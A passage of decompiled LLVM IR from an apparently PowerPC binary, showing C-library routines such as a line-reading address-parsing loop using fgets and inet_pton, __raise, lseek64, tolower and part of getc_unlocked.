  %v0_1001555c.in = phi i32 [ %v3_10015544, %dec_label_pc_10015538 ], [ %v3_100155445, %dec_label_pc_10015544.preheader ]
  %v0_1001555c = mul nuw nsw i32 %v0_1001555c.in, 2
  %v3_10015558 = load i32, i32* @global_var_1002c8a8, align 4
  store i32 %v3_10015558, i32* %r9.global-to-local, align 4
  %v2_1001555c = add i32 %v3_10015558, %v0_1001555c
  %v3_1001555c = inttoptr i32 %v2_1001555c to i16*
  %v4_1001555c = load i16, i16* %v3_1001555c, align 2
  %v5_1001555c = zext i16 %v4_1001555c to i32
  store i32 %v5_1001555c, i32* %r0.global-to-local, align 4
  %v1_10015560 = and i32 %v5_1001555c, 32
  store i32 %v1_10015560, i32* %r9.global-to-local, align 4
  %v3_10015560 = icmp eq i32 %v1_10015560, 0
  br i1 %v3_10015560, label %dec_label_pc_10015568, label %dec_label_pc_10015538

dec_label_pc_10015568:                            ; preds = %dec_label_pc_10015554
  %v0_10015568 = load i32, i32* @r29, align 4
  %v2_10015568 = icmp sgt i32 %v0_10015568, 6
  br i1 %v2_10015568, label %dec_label_pc_10015584.preheader, label %dec_label_pc_10015570

dec_label_pc_10015570:                            ; preds = %dec_label_pc_10015568
  %v1_10015570 = mul i32 %v0_10015568, 4
  store i32 %v1_10015570, i32* %r0.global-to-local, align 4
  %v1_10015574 = add i32 %v0_10015568, 1
  store i32 %v1_10015574, i32* @r29, align 4
  %v1_10015578 = load i32, i32* @r30, align 4
  %v3_10015578 = add i32 %v1_10015578, %v1_10015570
  %v4_10015578 = inttoptr i32 %v3_10015578 to i32*
  store i32 %v0_10015578, i32* %v4_10015578, align 4
  %v0_100155849.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10015584.preheader

dec_label_pc_10015584.preheader:                  ; preds = %dec_label_pc_10015570, %dec_label_pc_10015568
  %v0_100155849 = phi i32 [ %v0_100155849.pre, %dec_label_pc_10015570 ], [ %v0_10015578, %dec_label_pc_10015568 ]
  %v1_1001558410 = inttoptr i32 %v0_100155849 to i8*
  %v2_1001558411 = load i8, i8* %v1_1001558410, align 1
  %v3_1001558412 = zext i8 %v2_1001558411 to i32
  store i32 %v3_1001558412, i32* %r0.global-to-local, align 4
  %v3_1001558814 = icmp eq i8 %v2_1001558411, 0
  br i1 %v3_1001558814, label %dec_label_pc_100155a8.loopexit, label %dec_label_pc_10015594.lr.ph

dec_label_pc_10015594.lr.ph:                      ; preds = %dec_label_pc_10015584.preheader
  %v3_10015598.pre = load i32, i32* @global_var_1002c8a8, align 4
  br label %dec_label_pc_10015594

dec_label_pc_10015580:                            ; preds = %dec_label_pc_10015594
  %v1_10015580 = add i32 %v0_10015580, 1
  store i32 %v1_10015580, i32* %r11.global-to-local, align 4
  %v1_10015584 = inttoptr i32 %v1_10015580 to i8*
  %v2_10015584 = load i8, i8* %v1_10015584, align 1
  %v3_10015584 = zext i8 %v2_10015584 to i32
  store i32 %v3_10015584, i32* %r0.global-to-local, align 4
  %v3_10015588 = icmp eq i8 %v2_10015584, 0
  br i1 %v3_10015588, label %dec_label_pc_100155a8.loopexit, label %dec_label_pc_10015594

dec_label_pc_10015594:                            ; preds = %dec_label_pc_10015594.lr.ph, %dec_label_pc_10015580
  %v0_10015580 = phi i32 [ %v0_100155849, %dec_label_pc_10015594.lr.ph ], [ %v1_10015580, %dec_label_pc_10015580 ]
  %v0_1001559c.in = phi i32 [ %v3_1001558412, %dec_label_pc_10015594.lr.ph ], [ %v3_10015584, %dec_label_pc_10015580 ]
  %v0_1001559c = mul nuw nsw i32 %v0_1001559c.in, 2
  store i32 %v3_10015598.pre, i32* %r9.global-to-local, align 4
  %v2_1001559c = add i32 %v0_1001559c, %v3_10015598.pre
  %v3_1001559c = inttoptr i32 %v2_1001559c to i16*
  %v4_1001559c = load i16, i16* %v3_1001559c, align 2
  %v5_1001559c = zext i16 %v4_1001559c to i32
  store i32 %v5_1001559c, i32* %r0.global-to-local, align 4
  %v1_100155a0 = and i32 %v5_1001559c, 32
  store i32 %v1_100155a0, i32* %r9.global-to-local, align 4
  %v3_100155a0 = icmp eq i32 %v1_100155a0, 0
  br i1 %v3_100155a0, label %dec_label_pc_10015580, label %dec_label_pc_100155a8.loopexit

dec_label_pc_100155a8.loopexit:                   ; preds = %dec_label_pc_10015594, %dec_label_pc_10015580, %dec_label_pc_10015584.preheader
  %v0_100155a8 = phi i32 [ %v0_100155849, %dec_label_pc_10015584.preheader ], [ %v0_10015580, %dec_label_pc_10015594 ], [ %v1_10015580, %dec_label_pc_10015580 ]
  %v1_100155a8 = inttoptr i32 %v0_100155a8 to i8*
  %v2_100155a8 = load i8, i8* %v1_100155a8, align 1
  %v3_100155a8 = zext i8 %v2_100155a8 to i32
  store i32 %v3_100155a8, i32* %r0.global-to-local, align 4
  %v3_100155ac = icmp eq i8 %v2_100155a8, 0
  br i1 %v3_100155ac, label %dec_label_pc_100155b4, label %dec_label_pc_10015544.preheader

dec_label_pc_10015544.preheader:                  ; preds = %dec_label_pc_1001552c, %dec_label_pc_100155a8.loopexit
  %v0_100155442 = phi i32 [ %v0_100155a8, %dec_label_pc_100155a8.loopexit ], [ %v0_1001552c, %dec_label_pc_1001552c ]
  %v1_100155443 = inttoptr i32 %v0_100155442 to i8*
  %v2_100155444 = load i8, i8* %v1_100155443, align 1
  %v3_100155445 = zext i8 %v2_100155444 to i32
  store i32 %v3_100155445, i32* %r0.global-to-local, align 4
  %v3_100155487 = icmp eq i8 %v2_100155444, 0
  br i1 %v3_100155487, label %dec_label_pc_100155b4, label %dec_label_pc_10015554

dec_label_pc_100155b4:                            ; preds = %dec_label_pc_100155a8.loopexit, %dec_label_pc_10015544.preheader, %dec_label_pc_10015538, %dec_label_pc_1001552c
  %v0_100155b4 = load i32, i32* @r29, align 4
  %v1_100155b8 = mul i32 %v0_100155b4, 4
  store i32 %v1_100155b8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100155c0 = load i32, i32* @r30, align 4
  %v3_100155c0 = add i32 %v2_100155c0, %v1_100155b8
  %v4_100155c0 = inttoptr i32 %v3_100155c0 to i32*
  store i32 0, i32* %v4_100155c0, align 4
  %tmp55 = icmp slt i32 %v0_100155b4, 2
  br i1 %tmp55, label %dec_label_pc_10015668, label %dec_label_pc_100155c8

dec_label_pc_100155c8:                            ; preds = %dec_label_pc_100155b4
  %v0_100155c8 = load i32, i32* %r18.global-to-local, align 4
  %v3_100155c8 = icmp eq i32 %v0_100155c8, 1
  br i1 %v3_100155c8, label %dec_label_pc_10015680, label %dec_label_pc_100155d0

dec_label_pc_100155d0:                            ; preds = %dec_label_pc_100155c8
  %v3_100155d0 = icmp eq i32 %v0_100155c8, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_100155d0, label %dec_label_pc_100155dc, label %dec_label_pc_10015608.preheader

dec_label_pc_10015608.preheader:                  ; preds = %dec_label_pc_100155d0
  %v1_1001560823 = load i32, i32* @r29, align 4
  %v2_1001560824 = icmp sgt i32 %v1_1001560823, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001561029 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1001561029, i32* @r3, align 4
  br i1 %v2_1001560824, label %dec_label_pc_100155f4, label %dec_label_pc_10015618

dec_label_pc_100155dc:                            ; preds = %dec_label_pc_100155d0
  %v0_100155dc = load i32, i32* @r30, align 4
  %v1_100155dc = inttoptr i32 %v0_100155dc to i32*
  %v2_100155dc = load i32, i32* %v1_100155dc, align 4
  store i32 %v2_100155dc, i32* @r4, align 4
  %v0_100155e0 = load i32, i32* %r15.global-to-local, align 4
  %v2_100155e4 = inttoptr i32 %v0_100155e0 to i8*
  %v3_100155e4 = call i32 @__GI_strcoll(i8* %v2_100155e4, i32 %v2_100155dc)
  %v3_100155e8 = icmp eq i32 %v3_100155e4, 0
  br i1 %v3_100155e8, label %dec_label_pc_10015620, label %dec_label_pc_10015668

dec_label_pc_100155f4:                            ; preds = %dec_label_pc_10015608.preheader, %dec_label_pc_10015604
  %v1_100155f4 = phi i32 [ %v1_1001560c, %dec_label_pc_10015604 ], [ 4, %dec_label_pc_10015608.preheader ]
  %v0_1001561031 = phi i32 [ %v0_10015610, %dec_label_pc_10015604 ], [ %v0_1001561029, %dec_label_pc_10015608.preheader ]
  %v0_100155f4 = load i32, i32* @r30, align 4
  %v2_100155f4 = add i32 %v0_100155f4, %v1_100155f4
  %v3_100155f4 = inttoptr i32 %v2_100155f4 to i32*
  %v4_100155f4 = load i32, i32* %v3_100155f4, align 4
  store i32 %v4_100155f4, i32* @r4, align 4
  %v2_100155f8 = call i32 @__GI_strcasecmp(i32 %v0_1001561031, i32 %v4_100155f4)
  %v3_100155fc = icmp eq i32 %v2_100155f8, 0
  %v0_10015618.pre = load i32, i32* @r31, align 4
  br i1 %v3_100155fc, label %dec_label_pc_100155f4.dec_label_pc_10015618_crit_edge, label %dec_label_pc_10015604

dec_label_pc_10015604:                            ; preds = %dec_label_pc_100155f4
  %v1_10015604 = add i32 %v0_10015618.pre, 1
  store i32 %v1_10015604, i32* @r31, align 4
  %v1_10015608 = load i32, i32* @r29, align 4
  %v2_10015608 = icmp slt i32 %v1_10015604, %v1_10015608
  %v1_1001560c = mul i32 %v1_10015604, 4
  store i32 %v1_1001560c, i32* %r0.global-to-local, align 4
  %v0_10015610 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10015610, i32* @r3, align 4
  br i1 %v2_10015608, label %dec_label_pc_100155f4, label %dec_label_pc_10015618

dec_label_pc_100155f4.dec_label_pc_10015618_crit_edge: ; preds = %dec_label_pc_100155f4
  %v1_10015618.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10015618

dec_label_pc_10015618:                            ; preds = %dec_label_pc_10015604, %dec_label_pc_100155f4.dec_label_pc_10015618_crit_edge, %dec_label_pc_10015608.preheader
  %v1_10015618 = phi i32 [ %v1_10015618.pre, %dec_label_pc_100155f4.dec_label_pc_10015618_crit_edge ], [ %v1_1001560823, %dec_label_pc_10015608.preheader ], [ %v1_10015608, %dec_label_pc_10015604 ]
  %v0_10015618 = phi i32 [ %v0_10015618.pre, %dec_label_pc_100155f4.dec_label_pc_10015618_crit_edge ], [ 1, %dec_label_pc_10015608.preheader ], [ %v1_10015604, %dec_label_pc_10015604 ]
  %v2_10015618 = icmp slt i32 %v0_10015618, %v1_10015618
  br i1 %v2_10015618, label %dec_label_pc_10015620, label %dec_label_pc_10015668

dec_label_pc_10015620:                            ; preds = %dec_label_pc_100155dc, %dec_label_pc_10015618
  %v0_10015620 = load i32, i32* %r19.global-to-local, align 4
  %v3_10015620 = icmp eq i32 %v0_10015620, 2
  br i1 %v3_10015620, label %dec_label_pc_10015628, label %dec_label_pc_10015644

dec_label_pc_10015628:                            ; preds = %dec_label_pc_10015620
  %v0_10015628 = load i32, i32* @r30, align 4
  %v1_10015628 = inttoptr i32 %v0_10015628 to i32*
  %v2_10015628 = load i32, i32* %v1_10015628, align 4
  %v0_10015630 = load i32, i32* @r25, align 4
  store i32 268523064, i32* @lr, align 4
  %v3_10015634 = inttoptr i32 %v2_10015628 to i8*
  %v4_10015634 = call i32 @inet_pton(i32 2, i8* %v3_10015634, i32 %v0_10015630)
  %v2_10015638 = icmp sgt i32 %v4_10015634, 0
  br i1 %v2_10015638, label %dec_label_pc_10015488, label %dec_label_pc_10015664

dec_label_pc_10015644:                            ; preds = %dec_label_pc_10015620
  %v3_10015644 = icmp eq i32 %v0_10015620, 10
  br i1 %v3_10015644, label %dec_label_pc_1001564c, label %dec_label_pc_10015664

dec_label_pc_1001564c:                            ; preds = %dec_label_pc_10015644
  %v0_1001564c = load i32, i32* @r30, align 4
  %v1_1001564c = inttoptr i32 %v0_1001564c to i32*
  %v2_1001564c = load i32, i32* %v1_1001564c, align 4
  %v0_10015654 = load i32, i32* %r21.global-to-local, align 4
  store i32 268523100, i32* @lr, align 4
  %v3_10015658 = inttoptr i32 %v2_1001564c to i8*
  %v4_10015658 = call i32 @inet_pton(i32 10, i8* %v3_10015658, i32 %v0_10015654)
  %v2_1001565c = icmp sgt i32 %v4_10015658, 0
  br i1 %v2_1001565c, label %dec_label_pc_100154b8, label %dec_label_pc_10015664

dec_label_pc_10015664:                            ; preds = %dec_label_pc_10015628, %dec_label_pc_10015644, %dec_label_pc_1001564c
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10015668

dec_label_pc_10015668:                            ; preds = %dec_label_pc_10015618, %dec_label_pc_100155dc, %dec_label_pc_100155b4, %dec_label_pc_10015664, %dec_label_pc_10015500
  %v0_10015668 = load i32, i32* @r24, align 4
  %v0_1001566c = load i32, i32* @r27, align 4
  %v0_10015670 = load i32, i32* @r20, align 4
  store i32 268523128, i32* @lr, align 4
  %v3_10015674 = call i32 @fgets(i32 %v0_10015668, i32 %v0_1001566c, i32 %v0_10015670)
  %v3_10015678 = icmp eq i32 %v3_10015674, 0
  br i1 %v3_10015678, label %dec_label_pc_10015680, label %dec_label_pc_10015510

dec_label_pc_10015680:                            ; preds = %dec_label_pc_10015668, %dec_label_pc_100155c8, %dec_label_pc_100154e4
  %v0_10015680 = load i32, i32* %r18.global-to-local, align 4
  %v3_10015680 = icmp eq i32 %v0_10015680, 1
  br i1 %v3_10015680, label %dec_label_pc_10015698, label %dec_label_pc_10015688

dec_label_pc_10015688:                            ; preds = %dec_label_pc_10015680
  %v0_10015688 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10015690.1183 to i32), i32* @lr, align 4
  %v1_1001568c = inttoptr i32 %v0_10015688 to i16*
  %v2_1001568c = call i32 @__GI_fclose(i16* %v1_1001568c)
  br label %dec_label_pc_10015698

dec_label_pc_10015694:                            ; preds = %dec_label_pc_1001544c, %dec_label_pc_1001541c, %dec_label_pc_10015414, %dec_label_pc_10015408, %dec_label_pc_100153f8, %dec_label_pc_100153e0, %dec_label_pc_100153d0
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10015698

dec_label_pc_10015698:                            ; preds = %dec_label_pc_10015680, %dec_label_pc_10015688, %dec_label_pc_10015478, %dec_label_pc_10015694
  store i32 %v0_10015394, i32* %r0.global-to-local, align 4
  %v0_1001569c = load i32, i32* @r26, align 4
  ret i32 %v0_1001569c

; uselistorder directives
  uselistorder i32 %v0_10015610, { 1, 0 }
  uselistorder i32 %v1_10015604, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100155b8, { 1, 0 }
  uselistorder i32 %v0_100155b4, { 1, 0 }
  uselistorder i32 %v3_100155445, { 1, 0 }
  uselistorder i32 %v0_100155442, { 1, 0 }
  uselistorder i32 %v1_10015570, { 1, 0 }
  uselistorder i32 %v0_10015568, { 1, 0, 2 }
  uselistorder i32 %v2_10015518, { 1, 0 }
  uselistorder i32 %v0_10015408, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100153e0.pr, { 1, 0, 2 }
  uselistorder i32 %v1_100153ac, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 5, 6, 10, 1, 2, 3, 8, 9, 7, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 10, { 11, 30, 31, 32, 33, 34, 35, 36, 23, 24, 20, 21, 22, 38, 37, 39, 40, 6, 45, 1, 41, 2, 42, 0, 7, 12, 48, 13, 25, 14, 26, 27, 8, 43, 44, 16, 15, 4, 5, 19, 28, 29, 17, 3, 10, 9, 47, 18, 46 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 6, { 26, 27, 28, 29, 30, 0, 1, 2, 20, 21, 22, 23, 10, 11, 35, 3, 31, 32, 6, 4, 33, 12, 34, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 24, 25 }
  uselistorder i32* @global_var_1002c8a8, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 80, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder i32 48, { 17, 11, 12, 13, 1, 14, 15, 18, 6, 19, 20, 2, 21, 22, 23, 8, 24, 7, 25, 3, 0, 26, 27, 4, 16, 9, 10, 5 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 2, 0, 1, 3 }
  uselistorder i32 -48, { 2, 4, 3, 6, 1, 5, 0 }
  uselistorder i32* @r27, { 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 12, 13, 6, 14, 3, 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 88, 4, 89, 7, 90, 95, 15, 16, 86, 87, 82, 83, 84, 85, 91, 92, 93, 61, 62, 63, 64, 5, 65, 66, 67, 68, 8, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 9, 10, 11, 80, 81, 94, 21, 22, 17, 18, 19, 20 }
  uselistorder i32 32, { 52, 53, 54, 32, 55, 56, 33, 57, 58, 59, 60, 23, 24, 61, 74, 62, 34, 31, 63, 64, 20, 21, 46, 47, 45, 2, 3, 4, 22, 19, 65, 66, 35, 67, 68, 69, 70, 71, 72, 73, 0, 75, 76, 48, 49, 6, 5, 37, 8, 7, 36, 10, 9, 38, 1, 27, 50, 12, 11, 39, 28, 40, 51, 41, 14, 13, 16, 25, 15, 42, 43, 18, 26, 17, 44, 29, 30 }
  uselistorder i32* @r10, { 1, 2, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10015698, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10015668, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10015664, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015620, { 1, 0 }
  uselistorder label %dec_label_pc_10015618, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100155f4, { 1, 0 }
  uselistorder label %dec_label_pc_100155b4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10015544.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10015594, { 1, 0 }
  uselistorder label %dec_label_pc_1001552c, { 1, 0 }
  uselistorder label %dec_label_pc_10015500, { 1, 0 }
  uselistorder label %dec_label_pc_100154e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001544c, { 1, 0 }
  uselistorder label %dec_label_pc_100153e0, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100156b0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268523208, i32* @lr, align 4
  %v0_100156c4 = call i32 @__libc_getpid()
  %v0_100156cc = load i32, i32* @r29, align 4
  store i32 %v0_100156b0, i32* @lr, align 4
  %v2_100156dc = call i32 @kill(i32 %v0_100156c4, i32 %v0_100156cc)
  ret i32 %v2_100156dc

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100156e0 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1001570c = call i32 @__asm_mfcr()
  %v1_10015710 = and i32 %v0_1001570c, 268435456
  %v3_10015710 = icmp eq i32 %v1_10015710, 0
  store i32 %v0_1001570c, i32* %r31.global-to-local, align 4
  store i32 %v0_1001570c, i32* %r0.global-to-local, align 4
  br i1 %v3_10015710, label %dec_label_pc_10015734, label %dec_label_pc_10015724

dec_label_pc_10015724:                            ; preds = %entry
  %v0_10015724 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001572c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001572c = inttoptr i32 %v0_10015724 to i32*
  store i32 %v0_1001572c, i32* %v2_1001572c, align 4
  %v0_10015738.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015738

dec_label_pc_10015734:                            ; preds = %entry
  %v3_1001571c = icmp eq i32 %v0_1001570c, 0
  br i1 %v3_1001571c, label %dec_label_pc_10015744, label %dec_label_pc_10015738

dec_label_pc_10015738:                            ; preds = %dec_label_pc_10015734, %dec_label_pc_10015724
  %v0_10015738 = phi i32 [ %v0_1001570c, %dec_label_pc_10015734 ], [ %v0_10015738.pre, %dec_label_pc_10015724 ]
  %tmp = icmp slt i32 %v0_10015738, 0
  %v1_1001573c = zext i1 %tmp to i32
  %v2_1001573c = ashr i32 %v0_10015738, 31
  %v3_1001573c = and i32 %v2_1001573c, -2
  %v4_1001573c = or i32 %v3_1001573c, %v1_1001573c
  br label %dec_label_pc_1001574c

dec_label_pc_10015744:                            ; preds = %dec_label_pc_10015734
  %v3_10015744 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001574c

dec_label_pc_1001574c:                            ; preds = %dec_label_pc_10015738, %dec_label_pc_10015744
  %v0_1001575c = phi i32 [ %v4_1001573c, %dec_label_pc_10015738 ], [ %v3_10015744, %dec_label_pc_10015744 ]
  store i32 %v0_100156e0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001575c

; uselistorder directives
  uselistorder i32 %v0_10015738, { 1, 0 }
  uselistorder i32 %v0_1001570c, { 0, 3, 2, 1, 4 }
  uselistorder i32 31, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 2, 26, 27, 28, 29, 30, 8, 9, 3, 4, 0, 6, 5, 31, 32, 33, 50, 51, 48, 49, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 7, 10, 11, 46, 47 }
  uselistorder i32 268435456, { 7, 8, 19, 11, 4, 22, 23, 24, 25, 16, 21, 5, 20, 0, 9, 10, 1, 12, 27, 17, 13, 18, 30, 6, 14, 15, 2, 3, 26, 28, 29, 31 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001574c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10015760 = add i32 %arg1, 128
  %v1_10015764 = mul i32 %arg1, 2
  %v2_10015768 = icmp ugt i32 %v1_10015760, 383
  %v0_1001576c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10015768, i32 %v0_1001576c)
  %v3_10015774 = load i32, i32* bitcast (i32** @global_var_1002c8dc.1064 to i32*), align 4
  %v2_10015778 = add i32 %v1_10015764, %v3_10015774
  %v3_10015778 = inttoptr i32 %v2_10015778 to i16*
  %v4_10015778 = load i16, i16* %v3_10015778, align 2
  %v5_10015778 = sext i16 %v4_10015778 to i32
  ret i32 %v5_10015778
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10015780 = load i32, i32* @lr, align 4
  store i32 %v0_10015780, i32* %r0.global-to-local, align 4
  %v0_10015788 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10015794 = add i32 %tmp, 16
  %v3_10015794 = inttoptr i32 %v2_10015794 to i32*
  %v4_10015794 = load i32, i32* %v3_10015794, align 4
  store i32 %v4_10015794, i32* %r9.global-to-local, align 4
  %v2_10015798 = add i32 %tmp, 24
  %v3_10015798 = inttoptr i32 %v2_10015798 to i32*
  %v4_10015798 = load i32, i32* %v3_10015798, align 4
  store i32 %v4_10015798, i32* %r0.global-to-local, align 4
  %v2_1001579c = icmp ult i32 %v4_10015794, %v4_10015798
  br i1 %v2_1001579c, label %dec_label_pc_10015804, label %dec_label_pc_100157a4

dec_label_pc_100157a4:                            ; preds = %entry
  %v3_100157a4 = load i16, i16* %arg1, align 2
  %v4_100157a4 = zext i16 %v3_100157a4 to i32
  %v1_100157a8 = and i32 %v4_100157a4, 131
  store i32 %v1_100157a8, i32* %r0.global-to-local, align 4
  %v2_100157ac = icmp ugt i32 %v1_100157a8, 128
  br i1 %v2_100157ac, label %dec_label_pc_100157c4, label %dec_label_pc_100157b4

dec_label_pc_100157b4:                            ; preds = %dec_label_pc_100157a4
  store i32 268523452, i32* @lr, align 4
  %v3_100157b8 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10015794)
  store i32 %v3_100157b8, i32* %r3.global-to-local, align 4
  %v3_100157bc = icmp eq i32 %v3_100157b8, 0
  br i1 %v3_100157bc, label %dec_label_pc_100157b4.dec_label_pc_100157c4_crit_edge, label %dec_label_pc_100158a0

dec_label_pc_100157b4.dec_label_pc_100157c4_crit_edge: ; preds = %dec_label_pc_100157b4
  %v0_100157c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100157c4

dec_label_pc_100157c4:                            ; preds = %dec_label_pc_100157b4.dec_label_pc_100157c4_crit_edge, %dec_label_pc_100157a4
  %v2_10015824 = phi i32 [ %v0_100157c4.pre, %dec_label_pc_100157b4.dec_label_pc_100157c4_crit_edge ], [ %tmp, %dec_label_pc_100157a4 ]
  %v1_100157c4 = inttoptr i32 %v2_10015824 to i16*
  %v2_100157c4 = load i16, i16* %v1_100157c4, align 2
  %v3_100157c4 = zext i16 %v2_100157c4 to i32
  %v1_100157c8 = and i32 %v3_100157c4, 2
  store i32 %v1_100157c8, i32* %r0.global-to-local, align 4
  %v3_100157c8 = icmp eq i32 %v1_100157c8, 0
  br i1 %v3_100157c8, label %dec_label_pc_100157f4, label %dec_label_pc_100157d0

dec_label_pc_100157d0:                            ; preds = %dec_label_pc_100157c4
  %v1_100157d0 = call i32 @__asm_rlwinm(i32 %v3_100157c4, i32 2, i32 29, i32 29)
  %v1_100157d4 = load i32, i32* @r31, align 4
  %v2_100157d4 = add i32 %v1_100157d4, %v1_100157d0
  store i32 %v2_100157d4, i32* %r9.global-to-local, align 4
  %v1_100157d8 = add i32 %v2_100157d4, 39
  %v2_100157d8 = inttoptr i32 %v1_100157d8 to i8*
  %v3_100157d8 = load i8, i8* %v2_100157d8, align 1
  %v4_100157d8 = zext i8 %v3_100157d8 to i32
  store i32 %v4_100157d8, i32* %r0.global-to-local, align 4
  %v1_100157dc = add nsw i32 %v3_100157c4, -1
  store i32 %v1_100157dc, i32* %r9.global-to-local, align 4
  %v1_100157e0 = trunc i32 %v1_100157dc to i16
  %v3_100157e0 = inttoptr i32 %v1_100157d4 to i16*
  store i16 %v1_100157e0, i16* %v3_100157e0, align 2
  %v0_100157e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100157e4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100157ec = load i32, i32* @r31, align 4
  %v2_100157ec = add i32 %v1_100157ec, 40
  %v3_100157ec = inttoptr i32 %v2_100157ec to i32*
  store i32 0, i32* %v3_100157ec, align 4
  br label %dec_label_pc_100158a4

dec_label_pc_100157f4:                            ; preds = %dec_label_pc_100157c4
  %v1_100157f4 = add i32 %v2_10015824, 16
  %v2_100157f4 = inttoptr i32 %v1_100157f4 to i32*
  %v3_100157f4 = load i32, i32* %v2_100157f4, align 4
  store i32 %v3_100157f4, i32* %r9.global-to-local, align 4
  %v1_100157f8 = add i32 %v2_10015824, 20
  %v2_100157f8 = inttoptr i32 %v1_100157f8 to i32*
  %v3_100157f8 = load i32, i32* %v2_100157f8, align 4
  store i32 %v3_100157f8, i32* %r0.global-to-local, align 4
  %v4_100157fc = icmp eq i32 %v3_100157f8, %v3_100157f4
  br i1 %v4_100157fc, label %dec_label_pc_10015810, label %dec_label_pc_10015804

dec_label_pc_10015804:                            ; preds = %dec_label_pc_100157f4, %entry
  %v1_100158787 = phi i32 [ %v2_10015824, %dec_label_pc_100157f4 ], [ %tmp, %entry ]
  %v0_10015804 = phi i32 [ %v3_100157f4, %dec_label_pc_100157f4 ], [ %v4_10015794, %entry ]
  %v1_10015804 = inttoptr i32 %v0_10015804 to i8*
  %v2_10015804 = load i8, i8* %v1_10015804, align 1
  %v3_10015804 = zext i8 %v2_10015804 to i32
  store i32 %v3_10015804, i32* %r3.global-to-local, align 4
  %v1_10015808 = add i32 %v0_10015804, 1
  store i32 %v1_10015808, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015878

dec_label_pc_10015810:                            ; preds = %dec_label_pc_100157f4
  %v1_10015810 = add i32 %v2_10015824, 4
  %v2_10015810 = inttoptr i32 %v1_10015810 to i32*
  %v3_10015810 = load i32, i32* %v2_10015810, align 4
  store i32 %v3_10015810, i32* %r0.global-to-local, align 4
  %v3_10015814 = icmp eq i32 %v3_10015810, -2
